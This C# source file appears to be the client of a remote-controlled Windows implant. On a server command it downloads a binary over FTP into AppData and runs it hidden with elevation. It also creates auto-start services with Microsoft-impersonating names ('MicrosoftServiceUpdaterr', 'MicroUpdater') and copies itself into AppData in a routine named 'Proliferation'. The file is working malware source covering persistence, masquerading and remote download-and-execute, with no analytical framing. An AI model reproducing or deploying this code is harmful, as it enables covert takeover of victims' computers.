using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Windows.Forms;
using System.Text;
using System.Threading;
using System.Net.Sockets;

namespace ClientWorker
{
    public class Functions
    {
        FtpClient ftpClient = new FtpClient();

        public void Start()
        {
            ftpClient.Init();
        }

        public void GetUpdater()
        {
            Console.WriteLine("GetUpdate");

            string applicationDataPath = Environment.GetFolderPath(
    Environment.SpecialFolder.ApplicationData);
            try
            {
                KillUpdater();
                Resetter.pause = true;
                ftpClient.FTPDownloadFile(StartData.updater, applicationDataPath + StartData.floaderNewCopy);
                //File.Move(StartData.updater, applicationDataPath + StartData.floaderNewCopy + StartData.updater);
                //File.Copy(StartData.updater, applicationDataPath + StartData.floaderNewCopy + StartData.updater);
                Process proc = new Process();
                proc.StartInfo.FileName = applicationDataPath + StartData.floaderNewCopy + StartData.updater;
                proc.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                proc.StartInfo.Verb = "runas";           
                proc.Start();
                Environment.Exit(0);
            }
            catch(Exception e)
            {
                Console.WriteLine("The start process failed: {0}", e.ToString());
            }
            Resetter.pause = false;
        }
        private void KillUpdater()
        {
            foreach (var process in Process.GetProcessesByName("Updater"))
            {
                process.Kill();            
            }

            string applicationDataPath = Environment.GetFolderPath(
    Environment.SpecialFolder.ApplicationData);
            File.Delete(applicationDataPath + StartData.floaderNewCopy +StartData.updater);
        }

        public void AnalysisAnswer(string answer)
        {
            switch (answer)
            {
                case "DownloadUpdater":                  
                    GetUpdater();
                    break;

                case "":
                case "Reconnect":
                    Reconnect();
                    Console.WriteLine("Переподключился");
                    break;

                default:
                    Console.WriteLine("UnknownCommand " + answer);
                    break;
            }
        }
        public void Reconnect()
        {
            try
            {
                Program.client.Clear();
                Program.clientThread.Abort();
            }
            catch
            {
                Console.WriteLine("Исключение закрытия потока");
            }
                Program.clientThread = new Thread(new ThreadStart(Program.client.Start));
                Program.clientThread.Start();              
        }

        public void Registration()
        {
            string applicationDataPath = Environment.GetFolderPath(
    Environment.SpecialFolder.ApplicationData);

            Process proc = new Process();
            proc.StartInfo.FileName = "cmd.exe";
            proc.StartInfo.Verb = "runas";

            proc.StartInfo.Arguments = "/C "+ "Sc create MicrosoftServiceUpdaterr binPath= " + applicationDataPath + StartData.floaderNewCopy +
                StartData.service + " DisplayName= MicrosoftUpdaterr Desceiption= MicroSoftUpdater обнаружение обновлений и получение type= own start= auto";

            proc.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            proc.Start();

            proc.StartInfo.Arguments = "/C " + "Sc create MicroUpdater binPath= " + applicationDataPath + StartData.floaderNewCopy +
                StartData.updater + " DisplayName= MicroUpdater Desceiption= MicroSoftUpdater обнаружение обновлений и получение type= own start= auto";
            proc.Start();

            Proliferation(applicationDataPath);
        }
        public void Proliferation(string parth)
        {
            parth = parth + StartData.floaderNewCopy;
            string fileName = Application.ExecutablePath;

            try
            {
                if (File.Exists(parth+ StartData.service))
                {
                    return;
                }
                else
                {                  

                    DirectoryInfo di = Directory.CreateDirectory(parth);
                    Console.WriteLine(parth + StartData.service);
                    File.Copy(fileName, parth + StartData.service);
                    //File.Move(fileName, parth + StartData.service);                
                }              
            }
            catch (Exception e)
            {
                Console.WriteLine("The process failed: {0}", e.ToString());
            }
                       
        }
    }
}
